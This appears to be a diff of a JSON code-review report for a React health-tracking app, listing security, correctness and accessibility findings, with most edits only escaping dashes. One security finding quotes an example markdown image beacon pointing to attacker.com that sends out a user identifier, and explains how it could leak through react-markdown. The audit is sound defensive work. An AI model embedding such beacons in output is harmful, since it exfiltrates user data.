@@ -20,7 +20,7 @@
       "line": 33,
       "title": "copyRichContent writes raw AI-generated innerHTML to clipboard without sanitization",
       "description": "copyRichContent() calls el.innerHTML and writes the raw HTML string to the clipboard as 'text/html'. The innerHTML includes whatever react-markdown produced from AI text. While react-markdown does not set dangerouslySetInnerHTML itself, the rendered DOM includes all markdown-generated elements. Any HTML that leaked through the AI_MARKDOWN_COMPONENTS override (e.g., an unhandled element type or a future react-markdown regression) would be copied verbatim and could execute in the paste target if that application renders clipboard HTML. The more immediate concern is that el.innerText is already correct for plain-text fidelity; the rich-text copy is unnecessary for a 'copy report' feature and adds the attack surface for nothing.",
-      "fix": "Either (a) drop the 'text/html' ClipboardItem and copy el.innerText only — that is sufficient for pasting into notes/email with structure preserved as plain text — or (b) sanitize the HTML string through DOMPurify before writing it: `import DOMPurify from 'dompurify'; const safeHtml = DOMPurify.sanitize(html);`.",
+      "fix": "Either (a) drop the 'text/html' ClipboardItem and copy el.innerText only \u2014 that is sufficient for pasting into notes/email with structure preserved as plain text \u2014 or (b) sanitize the HTML string through DOMPurify before writing it: `import DOMPurify from 'dompurify'; const safeHtml = DOMPurify.sanitize(html);`.",
       "implemented": false
     },
     {
@@ -30,7 +30,7 @@
       "file": "src/components/archive/DrPooReport.tsx",
       "line": 49,
       "title": "CopyReportButton does not handle clipboard API failure",
-      "description": "handleCopy is an async function that awaits copyRichContent(), which itself calls navigator.clipboard.write(). Neither function has a try/catch. If the clipboard API is unavailable (e.g., non-secure context, permissions denied, Firefox without the ClipboardItem API), the promise rejects silently. The user sees no feedback — 'copied!' never appears, there is no error state, and the promise rejection is unhandled.",
+      "description": "handleCopy is an async function that awaits copyRichContent(), which itself calls navigator.clipboard.write(). Neither function has a try/catch. If the clipboard API is unavailable (e.g., non-secure context, permissions denied, Firefox without the ClipboardItem API), the promise rejects silently. The user sees no feedback \u2014 'copied!' never appears, there is no error state, and the promise rejection is unhandled.",
       "fix": "Wrap the await in a try/catch. On failure, surface a brief error message in place of 'copied!' (e.g., 'copy failed') or use a toast. Also: ClipboardItem is not supported in Firefox without a flag; consider a fallback path using document.execCommand('copy') on a temporary textarea.",
       "implemented": false
     },
@@ -51,7 +51,7 @@
       "category": "security",
       "file": "src/components/track/dr-poo/ConversationPanel.tsx",
       "line": 183,
-      "title": "react-markdown does not sanitize HTML by default — img, table, and raw HTML elements are rendered",
+      "title": "react-markdown does not sanitize HTML by default \u2014 img, table, and raw HTML elements are rendered",
       "description": "react-markdown with default settings renders safe HTML by subset, but it does allow some elements through that AI_MARKDOWN_COMPONENTS does not override: notably <img> (which can be used to trigger cross-origin requests or as a beacon), <table>, <blockquote>, and any inline HTML that a markdown parser passes through (depending on version and config). The AI_MARKDOWN_COMPONENTS override only handles <a>. If an AI response contains '![](https://attacker.com/track?user=X)' or an inline <script> that the underlying parser emits, it would render without interception.",
       "fix": "Pass `allowedElements` or `disallowedElements` props to the Markdown component to whitelist only safe elements. At minimum add an `img` override that renders null: `img: () => null`. Consider using the `rehype-sanitize` plugin for defence in depth: `import rehypeSanitize from 'rehype-sanitize'` and pass `rehypePlugins={[rehypeSanitize]}` to every Markdown usage.",
       "implemented": false
@@ -62,7 +62,7 @@
       "category": "correctness",
       "file": "src/components/track/dr-poo/ConversationPanel.tsx",
       "line": 35,
-      "title": "stableEndMs is computed inside useMemo with no deps — it will be stale after 7 days",
+      "title": "stableEndMs is computed inside useMemo with no deps \u2014 it will be stale after 7 days",
       "description": "The constant `farFuture = Date.now() + 7 * 24 * 60 * 60_000` is computed once on component mount inside a useMemo with an empty dep array `[]`. If the ConversationPanel stays mounted across the 7-day boundary (which is plausible for a persistent SPA where users stay logged in), stableEndMs will become stale and new messages timestamped after that point would not appear in the query window. This is a latent bug that would be very confusing to diagnose.",
       "fix": "Use a sufficiently distant fixed constant rather than Date.now() + delta, or recalculate the boundary at a longer cadence using a useInterval/useEffect. The simplest safe fix is `const FAR_FUTURE = 9999999999999` (year 2286) as a module-level constant, since the intent is just 'no upper bound'.",
       "implemented": false
@@ -73,7 +73,7 @@
       "category": "correctness",
       "file": "src/components/track/dr-poo/ConversationPanel.tsx",
       "line": 51,
-      "title": "Optimistic dedup uses content.trim() equality — collides on identical messages",
+      "title": "Optimistic dedup uses content.trim() equality \u2014 collides on identical messages",
       "description": "confirmedUserContents is a Set of trimmed message content strings. If the user sends the same message twice (e.g., 'How am I doing?' submitted twice), both messages would have identical trimmed content. The second confirmed message would suppress the second optimistic entry, making it appear that only one message was sent until the analysis completes. This is a minor UX bug but can cause genuine confusion about whether the second message was captured.",
       "fix": "Dedup optimistic entries against confirmed entries by timestamp or by the Convex _id field, not content. The pendingReplies query already returns objects with _id from Convex; use that for identity comparison instead of content equality.",
       "implemented": false
@@ -95,8 +95,8 @@
       "category": "correctness",
       "file": "src/components/track/dr-poo/ConversationPanel.tsx",
       "line": 81,
-      "title": "periodSummary filter condition is backwards — excludes current-period summaries",
-      "description": "The condition `latestWeeklySummary.weekEndTimestamp <= halfWeekStartMs` filters OUT summaries whose weekEndTimestamp is after the current half-week boundary. The intent described in comments is to show a 'period summary pinned at top'. But this condition means: only show the summary if it ended BEFORE the current window started — i.e., only show an OLD (previous period) summary. If the summary was generated for the current period, weekEndTimestamp would be >= halfWeekStartMs and would be excluded. This may be intentional design (showing the previous period summary as context), but if so it is not documented and the variable naming 'latestWeeklySummary' suggests it should be the most recent one.",
+      "title": "periodSummary filter condition is backwards \u2014 excludes current-period summaries",
+      "description": "The condition `latestWeeklySummary.weekEndTimestamp <= halfWeekStartMs` filters OUT summaries whose weekEndTimestamp is after the current half-week boundary. The intent described in comments is to show a 'period summary pinned at top'. But this condition means: only show the summary if it ended BEFORE the current window started \u2014 i.e., only show an OLD (previous period) summary. If the summary was generated for the current period, weekEndTimestamp would be >= halfWeekStartMs and would be excluded. This may be intentional design (showing the previous period summary as context), but if so it is not documented and the variable naming 'latestWeeklySummary' suggests it should be the most recent one.",
       "fix": "Clarify intent with a comment. If the goal is to show the previous period's summary as historical context, rename the variable to `previousPeriodSummary` and add an explicit comment. If the goal is to show the summary relevant to the current window, flip the condition to `>=`.",
       "implemented": false
     },
@@ -107,7 +107,7 @@
       "file": "src/components/track/dr-poo/ReplyInput.tsx",
       "line": 34,
       "title": "addReply mutation failure is silently swallowed",
-      "description": "handleSubmit calls addReply(trimmed) — which is an async Convex mutation — but does not await it and has no error handling. The text is cleared from the input immediately on line 35 before the mutation succeeds. If the mutation fails (network error, auth error, validation error), the user's message is lost with no feedback. The input is cleared and the message never appears in the conversation.",
+      "description": "handleSubmit calls addReply(trimmed) \u2014 which is an async Convex mutation \u2014 but does not await it and has no error handling. The text is cleared from the input immediately on line 35 before the mutation succeeds. If the mutation fails (network error, auth error, validation error), the user's message is lost with no feedback. The input is cleared and the message never appears in the conversation.",
       "fix": "Make handleSubmit async, await addReply, and handle the error case. On failure, restore the text to the input and show an error message. Since handleSubmit is used as a useCallback, mark the callback async and add try/catch: `const trimmed = text.trim(); setText(''); try { await addReply(trimmed); } catch { setText(trimmed); /* show error */ }`.",
       "implemented": false
     },
@@ -119,7 +119,7 @@
       "line": 32,
       "title": "Error display truncates at 120 chars but provides no way to see the full error",
       "description": "The error message is truncated to 120 characters with an ellipsis appended. For API errors, the relevant diagnostic detail (e.g., HTTP status code, rate limit info) often appears beyond that cutoff. Developers and power users have no way to see the full error without opening devtools.",
-      "fix": "Either expand to a slightly larger limit (300 chars is still reasonable for inline display), or wrap the error text in a collapsible/tooltip that shows the full message on hover/expand. For a clinical health app, clear error messaging is important — users may need to relay errors to support.",
+      "fix": "Either expand to a slightly larger limit (300 chars is still reasonable for inline display), or wrap the error text in a collapsible/tooltip that shows the full message on hover/expand. For a clinical health app, clear error messaging is important \u2014 users may need to relay errors to support.",
       "implemented": false
     },
     {
@@ -128,7 +128,7 @@
       "category": "accessibility",
       "file": "src/components/track/dr-poo/ConversationPanel.tsx",
       "line": 228,
-      "title": "Expand/Collapse button is only visible on hover — keyboard users cannot discover it",
+      "title": "Expand/Collapse button is only visible on hover \u2014 keyboard users cannot discover it",
       "description": "The ExpandableMessage expand/collapse button has `opacity-0 group-hover:opacity-100 group-focus-within:opacity-100`. The group-focus-within rule means that if focus lands inside the group it becomes visible, but the button itself is the only interactive element inside the group container (the message content is not focusable). A keyboard user tabbing through the conversation would need to tab to the button to make it visible, but has no indication it exists before doing so. Screen readers would still announce it since opacity does not affect accessibility tree presence, but sighted keyboard users would not see it.",
       "fix": "Always show the button (remove opacity-0 default) but use a lower opacity at rest (e.g., `opacity-30`) that increases on hover/focus. Alternatively, use a visually-present toggle icon (like a chevron) that is always visible rather than a hidden button.",
       "implemented": false
@@ -162,7 +162,7 @@
       "file": "src/components/archive/DrPooReport.tsx",
       "line": 92,
       "title": "DrPooReportDetails renders section 3 (Next Food to Try) unconditionally without null guard",
-      "description": "All other optional sections (clinicalReasoning, mealPlan, educationalInsight, suggestions, miniChallenge, lifestyleExperiment) are guarded with conditional rendering. Section 3 — nextFoodToTry — renders unconditionally. If the AI returns a response where nextFoodToTry is null, undefined, or an empty object, this will either render an empty card or throw a runtime error accessing nextFoodToTry.food.",
+      "description": "All other optional sections (clinicalReasoning, mealPlan, educationalInsight, suggestions, miniChallenge, lifestyleExperiment) are guarded with conditional rendering. Section 3 \u2014 nextFoodToTry \u2014 renders unconditionally. If the AI returns a response where nextFoodToTry is null, undefined, or an empty object, this will either render an empty card or throw a runtime error accessing nextFoodToTry.food.",
       "fix": "Wrap the section with a guard: `{insights.nextFoodToTry && (...)}`. Check the AiNutritionistInsight type definition to confirm whether nextFoodToTry is optional; if it is required by type, add a runtime guard anyway since AI output shape cannot be fully trusted.",
       "implemented": false
     },
@@ -172,7 +172,7 @@
       "category": "simplicity",
       "file": "src/components/archive/ai-insights/index.ts",
       "line": 1,
-      "title": "index.ts only re-exports one item — barrel file adds indirection for no benefit",
+      "title": "index.ts only re-exports one item \u2014 barrel file adds indirection for no benefit",
       "description": "The index.ts re-exports only AnalysisProgressOverlay from one file. MealIdeaCard and the AI_MARKDOWN_COMPONENTS constant are not exported through the barrel. The barrel adds a level of import indirection (consumers import from the barrel, not directly from the file) without providing grouping, tree-shaking, or API-surface benefits for a single export.",
       "fix": "Either add all public exports from the directory to make the barrel meaningful, or delete the barrel and import AnalysisProgressOverlay directly from its file. Lean toward deletion since it currently obscures the module structure.",
       "implemented": false
@@ -181,7 +181,7 @@
   "summary": {
     "critical": 0,
     "high": 4,
-    "moderate": 7,
+    "moderate": 8,
     "nice_to_have": 3
   }
 }
